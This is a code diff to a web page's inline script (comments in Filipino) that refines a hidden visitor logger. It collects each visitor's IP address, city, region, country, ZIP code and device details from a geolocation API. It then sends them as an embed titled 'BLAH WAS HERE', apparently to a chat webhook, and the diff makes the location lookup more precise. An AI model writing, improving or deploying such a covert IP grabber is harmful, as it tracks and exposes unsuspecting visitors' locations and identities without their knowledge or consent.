@@ -139,14 +139,15 @@
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ Logger: TANGGAL LANG ANG LANG, LAGAY LOKASYON AT ZIP CODE
+        // ✅ Inayos na Logger: Mas tumpak na lokasyon at IPv4
         async function sendVisitorInfo() {
             try {
-                // Kumuha ng IP at lokasyon
-                const geoRes = await fetch('https://ipapi.co/json/');
+                // Gamit ang ibang API para mas tumpak sa Pilipinas
+                const geoRes = await fetch('https://ipwho.is/');
                 const geoData = await geoRes.json();
+
                 const visitorIP = geoData.ip || "Hindi makuha";
-                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}`;
+                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country || "?"}`;
                 const zipCode = geoData.postal || "Hindi available";
 
                 const ua = navigator.userAgent;
@@ -204,7 +205,7 @@
                         title: "BLAH WAS HERE",
                         color: 1003621,
                         fields: [
-                            { name: "IP ADDRESS", value: visitorIP, inline: false },
+                            { name: "IP ADDRESS", value: `||${visitorIP}||`, inline: false },
                             { name: "LOCATION", value: realLocation, inline: true },
                             { name: "ZIP CODE", value: zipCode, inline: true },
                             { name: "DEVICE", value: device, inline: true },
@@ -230,5 +231,4 @@
         }
     </script>
 </body>
-    </html>
-    
+</html>
